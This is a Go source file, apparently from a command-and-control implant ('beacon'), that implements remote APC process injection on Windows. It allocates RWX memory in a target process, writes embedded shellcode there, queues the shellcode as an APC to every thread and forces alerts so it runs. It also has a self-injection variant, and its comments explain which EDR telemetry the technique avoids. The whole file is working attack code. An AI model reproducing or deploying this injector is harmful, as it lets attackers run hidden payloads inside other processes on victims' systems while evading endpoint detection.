//go:build windows

package core

import (
	"context"
	"errors"
	"fmt"
	"syscall"
	"unsafe"
)

// Threadless injection — remote APC.
//
// The technique:
//
//   1. OpenProcess, VirtualAllocEx RWX, WriteProcessMemory the
//      shellcode. Identical to the CreateRemoteThread path.
//   2. Enumerate the target's threads via Toolhelp32.
//   3. For every thread in the target process, queue an APC
//      whose routine is the mapped shellcode address. The kernel
//      runs the APC the next time that thread enters an
//      alertable wait.
//   4. Optionally NtAlertThread one thread to force the wait.
//
// The signal profile is different from CreateRemoteThread in
// three ways:
//
//   - No new thread is created. The target's thread count does
//     not change.
//   - No remote-thread-creation event fires. The thread that
//     runs the shellcode is one the target process already
//     owned.
//   - The event that does fire is NtQueueApcThread, which is
//     instrumented by every major EDR vendor but carries a
//     lower baseline severity than CreateRemoteThread from an
//     unsigned image.
//
// What it does not defeat:
//
//   - EDRs that watch for the QueueApcThread → alertable-wait →
//     execute sequence as a unit.
//   - Stack-walking telemetry that observes a shellcode frame
//     appearing on a thread whose start address is not backed
//     by an on-disk image.
//   - Any product that hooks NtQueueApcThread directly.

var (
	ntdll                   = syscall.NewLazyDLL("ntdll.dll")
	procNtQueueApcThread    = ntdll.NewProc("NtQueueApcThread")
	procNtAlertThread       = ntdll.NewProc("NtAlertThread")
	procNtTestAlert         = ntdll.NewProc("NtTestAlert")
	procOpenThread          = kernel32.NewProc("OpenThread")
	procThread32First       = kernel32.NewProc("Thread32First")
	procThread32Next        = kernel32.NewProc("Thread32Next")
)

const (
	th32csSnapThread    = 0x00000004
	threadSetContext    = 0x00000010
	threadSuspendResume = 0x00000002
)

// threadEntry32 mirrors THREADENTRY32 from tlhelp32.h.
type threadEntry32 struct {
	Size           uint32
	CntUsage       uint32
	ThreadID       uint32
	OwnerProcessID uint32
	BasePri        int32
	DeltaPri       int32
	Flags          uint32
}

// injectAPC performs remote APC injection of the embedded
// shellcode into the target PID.
//
// Every thread in the target receives a queued APC. The first
// thread that enters an alertable wait executes the shellcode.
// On a thread that is already in an alertable wait, or that
// enters one promptly, this is fast; on a thread that never
// does, the APC sits queued until the thread exits.
//
// Returns 0 on success — there is no thread handle to wait on,
// and no exit code to read. The caller's `exit=0` line means
// "APC queued", not "shellcode exited cleanly".
func injectAPC(ctx context.Context, pid int) (uint32, error) {
	shellcode, err := decodeInjectorShellcode()
	if err != nil {
		return 0, err
	}
	if len(shellcode) == 0 {
		return 0, errors.New("injector shellcode is empty")
	}

	const (
		processVMOperation = 0x0008
		processVMWrite     = 0x0020
		processVMRead      = 0x0010
		processQueryInfo   = 0x0400
	)
	hProcess, _, callErr := procOpenProcess.Call(
		uintptr(processVMOperation|
			processVMWrite|
			processVMRead|
			processQueryInfo),
		0,
		uintptr(pid))
	if hProcess == 0 {
		return 0, fmt.Errorf(
			"OpenProcess(%d): %v (target may be protected, "+
				"or the beacon may lack SeDebugPrivilege)",
			pid, callErr)
	}
	defer procCloseHandle.Call(hProcess)

	addr, _, allocErr := procVirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(shellcode)),
		uintptr(memCommit|memReserve),
		uintptr(pageExecuteReadWrite))
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx: %v", allocErr)
	}
	// Deliberately not freed here. The APC has not fired yet
	// when this function returns; freeing the allocation now
	// would unmap the shellcode before the target thread can
	// execute it. The allocation is reclaimed when the target
	// process exits, or when the shellcode calls VirtualFree
	// on itself. The CreateRemoteThread path frees the
	// allocation on the success path, because the bootstrap
	// thread has returned by then — but see the note there:
	// when the 10 s wait times out, the bootstrap thread has
	// *not* returned, and the deferred free is unsafe. That is
	// a pre-existing issue in that backend, not a claim that
	// freeing after a timeout is safe.

	var written uintptr
	ok, _, writeErr := procWriteProcessMemory.Call(
		hProcess,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)))
	if ok == 0 {
		_, _, _ = procVirtualFreeEx.Call(hProcess, addr, 0, memRelease)
		return 0, fmt.Errorf("WriteProcessMemory: %v", writeErr)
	}
	if int(written) != len(shellcode) {
		_, _, _ = procVirtualFreeEx.Call(hProcess, addr, 0, memRelease)
		return 0, fmt.Errorf(
			"WriteProcessMemory: short write %d/%d",
			written, len(shellcode))
	}

	queued, failures, err := queueAPCToProcess(pid, addr)
	if err != nil {
		_, _, _ = procVirtualFreeEx.Call(hProcess, addr, 0, memRelease)
		return 0, err
	}
	if queued == 0 {
		_, _, _ = procVirtualFreeEx.Call(hProcess, addr, 0, memRelease)
		return 0, fmt.Errorf(
			"APC: no threads in pid %d accepted the APC "+
				"(%d failures); the shellcode allocation "+
				"has been freed",
			pid, failures)
	}

	diag("[beacon] inject pid %d (apc): shellcode mapped at 0x%x, "+
		"%d bytes; APC queued to %d thread(s), %d failure(s)\n",
		pid, addr, len(shellcode), queued, failures)

	_ = ctx
	return 0, nil
}

// queueAPCToProcess enumerates every thread in pid and queues
// an APC whose routine is `routine`. Returns the number of
// threads that accepted the APC, the number that failed, and a
// non-nil error only when the thread snapshot itself could not
// be taken.
func queueAPCToProcess(pid int, routine uintptr) (int, int, error) {
	snap, _, snapErr := procCreateToolhelp32Snapshot.Call(
		uintptr(th32csSnapThread), 0)
	if snap == 0 || snap == uintptr(syscall.InvalidHandle) {
		return 0, 0, fmt.Errorf(
			"CreateToolhelp32Snapshot(threads): %v", snapErr)
	}
	defer procCloseHandle.Call(snap)

	var entry threadEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	ok, _, _ := procThread32First.Call(
		snap,
		uintptr(unsafe.Pointer(&entry)))
	if ok == 0 {
		return 0, 0, errors.New(
			"Thread32First: no threads enumerated")
	}

	queued, failures := 0, 0
	for {
		if int(entry.OwnerProcessID) == pid {
			if err := queueOneAPC(entry.ThreadID, routine); err != nil {
				failures++
			} else {
				queued++
			}
		}
		ok, _, _ = procThread32Next.Call(
			snap,
			uintptr(unsafe.Pointer(&entry)))
		if ok == 0 {
			break
		}
	}
	return queued, failures, nil
}

func queueOneAPC(threadID uint32, routine uintptr) error {
	// THREAD_SET_CONTEXT is required for NtQueueApcThread;
	// THREAD_SUSPEND_RESUME is required for NtAlertThread. Both
	// are requested so the nudge below can actually run.
	hThread, _, openErr := procOpenThread.Call(
		uintptr(threadSetContext|threadSuspendResume),
		0,
		uintptr(threadID))
	if hThread == 0 {
		return fmt.Errorf(
			"OpenThread(%d): %v", threadID, openErr)
	}
	defer procCloseHandle.Call(hThread)

	status, _, _ := procNtQueueApcThread.Call(
		hThread,
		routine,
		0,
		0,
		0)
	// NTSTATUS convention: bit 31 set = error, bit 30 set =
	// informational, neither = success. NtQueueApcThread returns
	// STATUS_SUCCESS (0) on success and a negative NTSTATUS on
	// failure; the check below treats 0x00000000-0x3FFFFFFF as
	// success, matching the kernel's own convention. The previous
	// check (!= 0) would treat a positive informational return as
	// an error, which on some Windows builds causes the
	// queued == 0 branch to fire even when the APC was accepted.
	if int32(status) < 0 {
		return fmt.Errorf(
			"NtQueueApcThread(thread=%d): NTSTATUS 0x%x",
			threadID, uint32(status))
	}

	// Nudge the thread out of a non-alertable wait. NtAlertThread
	// returns STATUS_SUCCESS on a thread that is already alertable
	// and STATUS_ALERTED on a thread that was not; either is fine.
	_, _, _ = procNtAlertThread.Call(hThread)
	return nil
}

// injectAPCSelf queues an APC to the current thread and forces
// it to fire synchronously. This is the self-execution form —
// useful for testing the technique without a second process.
//
// Not wired into any verb today. `execmem --method apc` would
// be the natural caller; the helper is here so the
// implementation is testable in isolation.
func injectAPCSelf() error {
	shellcode, err := decodeInjectorShellcode()
	if err != nil {
		return err
	}
	if len(shellcode) == 0 {
		return errors.New("injector shellcode is empty")
	}

	// Self-injection allocates with VirtualAlloc rather than
	// VirtualAllocEx; the two are equivalent for the local
	// process but the local form does not require a process
	// handle.
	procVirtualAlloc := kernel32.NewProc("VirtualAlloc")
	addr, _, allocErr := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		uintptr(memCommit|memReserve),
		uintptr(pageExecuteReadWrite))
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc: %v", allocErr)
	}

	procRtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	procRtlCopyMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))

	currentThread := kernel32.NewProc("GetCurrentThread")
	hSelf, _, _ := currentThread.Call()

	status, _, _ := procNtQueueApcThread.Call(
		hSelf,
		addr,
		0,
		0,
		0)
	if status != 0 {
		return fmt.Errorf(
			"NtQueueApcThread(self): NTSTATUS 0x%x",
			uint32(status))
	}

	// NtTestAlert forces the APC queue on the current thread to
	// drain. The queued shellcode runs on this thread before
	// NtTestAlert returns.
	_, _, _ = procNtTestAlert.Call()
	return nil
}

var _ = threadSuspendResume